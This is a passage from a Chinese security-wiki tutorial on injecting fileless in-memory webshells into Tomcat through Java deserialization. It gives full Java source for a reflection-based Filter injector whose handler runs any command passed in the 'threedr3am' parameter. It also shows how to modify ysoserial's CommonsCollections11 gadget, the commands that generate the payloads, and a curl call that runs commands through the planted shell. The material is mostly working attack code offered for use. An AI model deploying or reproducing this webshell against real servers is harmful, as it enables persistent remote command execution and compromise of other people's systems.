<span class="w">                            </span><span class="err">.</span><span class="nc">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;state&quot;</span><span class="p">);</span>
                        <span class="n">stateField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
                        <span class="n">stateField</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">LifecycleState</span><span class="o">.</span><span class="n">STARTING_PREP</span><span class="p">);</span>
                        <span class="o">//</span><span class="n">创建一个自定义的Filter马</span>
                        <span class="n">Filter</span> <span class="n">threedr3am</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TomcatShellInject</span><span class="p">();</span>
                        <span class="o">//</span><span class="n">添加filter马</span>
                        <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">FilterRegistration</span><span class="o">.</span><span class="n">Dynamic</span> <span class="n">filterRegistration</span> <span class="o">=</span> <span class="n">servletContext</span>
                            <span class="o">.</span><span class="n">addFilter</span><span class="p">(</span><span class="s2">&quot;threedr3am&quot;</span><span class="p">,</span> <span class="n">threedr3am</span><span class="p">);</span>
                        <span class="n">filterRegistration</span><span class="o">.</span><span class="n">setInitParameter</span><span class="p">(</span><span class="s2">&quot;encoding&quot;</span><span class="p">,</span> <span class="s2">&quot;utf-8&quot;</span><span class="p">);</span>
                        <span class="n">filterRegistration</span><span class="o">.</span><span class="n">setAsyncSupported</span><span class="p">(</span><span class="n">false</span><span class="p">);</span>
                        <span class="n">filterRegistration</span>
                            <span class="o">.</span><span class="n">addMappingForUrlPatterns</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">EnumSet</span><span class="o">.</span><span class="n">of</span><span class="p">(</span><span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">DispatcherType</span><span class="o">.</span><span class="n">REQUEST</span><span class="p">),</span> <span class="n">false</span><span class="p">,</span>
                                <span class="n">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s2">&quot;/*&quot;</span><span class="p">});</span>
                        <span class="o">//</span><span class="n">状态恢复</span><span class="err">，</span><span class="n">要不然服务不可用</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">stateField</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">stateField</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">LifecycleState</span><span class="o">.</span><span class="n">STARTED</span><span class="p">);</span>
                        <span class="p">}</span>

                        <span class="k">if</span> <span class="p">(</span><span class="n">standardContext</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                            <span class="o">//</span><span class="n">生效filter</span>
                            <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Method</span> <span class="n">filterStartMethod</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">StandardContext</span><span class="o">.</span><span class="k">class</span>
<span class="w">                                </span><span class="err">.</span><span class="nc">getMethod</span><span class="p">(</span><span class="s2">&quot;filterStart&quot;</span><span class="p">);</span>
                            <span class="n">filterStartMethod</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
                            <span class="n">filterStartMethod</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span> <span class="n">null</span><span class="p">);</span>

                            <span class="o">//</span><span class="n">把filter插到第一位</span>
                            <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">descriptor</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">FilterMap</span><span class="p">[]</span> <span class="n">filterMaps</span> <span class="o">=</span> <span class="n">standardContext</span>
                                <span class="o">.</span><span class="n">findFilterMaps</span><span class="p">();</span>
                            <span class="k">for</span> <span class="p">(</span><span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">filterMaps</span><span class="o">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span> <span class="p">(</span><span class="n">filterMaps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">getFilterName</span><span class="p">()</span><span class="o">.</span><span class="n">equalsIgnoreCase</span><span class="p">(</span><span class="s2">&quot;threedr3am&quot;</span><span class="p">))</span> <span class="p">{</span>
                                    <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">tomcat</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">descriptor</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                                    <span class="n">filterMaps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
                                    <span class="n">filterMaps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">filterMap</span><span class="p">;</span>
                                    <span class="k">break</span><span class="p">;</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nd">@Override</span>
    <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">SerializationHandler</span><span class="p">[]</span> <span class="n">handlers</span><span class="p">)</span> <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>

    <span class="p">}</span>

    <span class="nd">@Override</span>
    <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="p">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="p">)</span>
        <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>

    <span class="p">}</span>

    <span class="nd">@Override</span>
    <span class="n">public</span> <span class="n">void</span> <span class="n">init</span><span class="p">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="p">)</span> <span class="n">throws</span> <span class="n">ServletException</span> <span class="p">{</span>

    <span class="p">}</span>

    <span class="nd">@Override</span>
    <span class="n">public</span> <span class="n">void</span> <span class="n">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="p">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="p">,</span>
        <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ServletException</span> <span class="p">{</span>
        <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span>
            <span class="s2">&quot;TomcatShellInject doFilter.....................................................................&quot;</span><span class="p">);</span>
        <span class="n">String</span> <span class="n">cmd</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&quot;threedr3am&quot;</span><span class="p">))</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
            <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">BufferedReader</span> <span class="n">bufferedReader</span> <span class="o">=</span> <span class="n">new</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">BufferedReader</span><span class="p">(</span>
                <span class="n">new</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">()));</span>
            <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">line</span><span class="p">;</span>
            <span class="k">while</span> <span class="p">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">bufferedReader</span><span class="o">.</span><span class="n">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">stringBuilder</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">servletResponse</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">()</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">stringBuilder</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">getBytes</span><span class="p">());</span>
            <span class="n">servletResponse</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">()</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
            <span class="n">servletResponse</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">()</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">filterChain</span><span class="o">.</span><span class="n">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span> <span class="n">servletResponse</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nd">@Override</span>
    <span class="n">public</span> <span class="n">void</span> <span class="n">destroy</span><span class="p">()</span> <span class="p">{</span>

    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>和第一个步骤创建的TomcatEchoInject不一样，这里我们不但基础了AbstractTranslet，还实现了Filter创建一个我们自定义的内存Webshell</p>
<p>最后，我们也按照第一个步骤那样，创建一个ysoserial的<code>CommonsCollections11</code>类的拷贝，名叫<code>CommonsCollections11ForTomcatShellInject</code>，并把其<code>Gadgets.createTemplatesImpl(command[0])</code>的调用改成<code>Gadgets.createTemplatesImpl(null, TomcatShellInject.class)</code>，这样，我们的Webshell
payload就完成了。</p>
<p>通过执行maven打包</p>
<div class="codehilite"><pre><span></span><code>mvn clean -Dmaven.test.skip=true compile assembly:assembly
</code></pre></div>

<p>然后执行生成的jar</p>
<div class="codehilite"><pre><span></span><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatShellInject &gt; ~/tmp/TomcatEchoInject.ysoserial
</code></pre></div>

<p>就生成了CommonsCollections11ForTomcatShellInject的payload了</p>
<h2 id="0x03">0x03 测试<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
<p>上一节中，我们生成了两个payload，接下来，我们启动一个具有<code>commons-collections:commons-collections:3.2.1</code>依赖的服务端，并且存在反序列化的接口。</p>
<p>然后我们把步骤一和步骤二生成的payload依次打过去</p>
<p><img alt="" src="../resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId27.png" /></p>
<p><img alt="" src="../resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId28.png" /></p>
<p>可以依次看到，两个步骤都返回500异常，相关信息证明已经执行反序列化成功了，接下来我们试试这个内存Webshell</p>
<p><img alt="" src="../resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId29.png" /></p>
<p><img alt="" src="../resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId30.png" /></p>
<p>完美，具体ysoserial改造后的代码，我已经上传到github，有兴趣可以看看
<a href="https://github.com/ianxtianxt/ysoserial">ianxtianxt/ysoserial</a></p>
<h3 id="_3">使用方法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Tomcat通杀回显-内存webshell</p>
<p>例：</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span>
<span class="n">CommonsCollections11ForTomcatEchoInject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">echo</span><span class="o">.</span><span class="n">payload</span>
</code></pre></div>

<blockquote>
<p>然后使用上述得到的恶意序列化数据echo.payload攻击一遍，然后再继续下面的操作</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span>
<span class="n">CommonsCollections11ForTomcatShellInject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="o">.</span><span class="n">payload</span>
</code></pre></div>

<blockquote>
<p>使用恶意序列化数据shell.payload再攻击一遍，可以得到一个内存级的webshell，任意路径，参数threedram为命令</p>
</blockquote>
<div class="codehilite"><pre><span></span><code>curl http://127.0.0.1:8080/aaa\?threedr3am\=ls%20/
</code></pre></div>

<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a>#toc-3</p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-link">
        通过jmx攻击Tomcat
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Tomcat%E6%A0%B7%E4%BE%8B%E7%9B%AE%E5%BD%95session%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Tomcat%E6%A0%B7%E4%BE%8B%E7%9B%AE%E5%BD%95session%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Tomcat样例目录session操纵漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>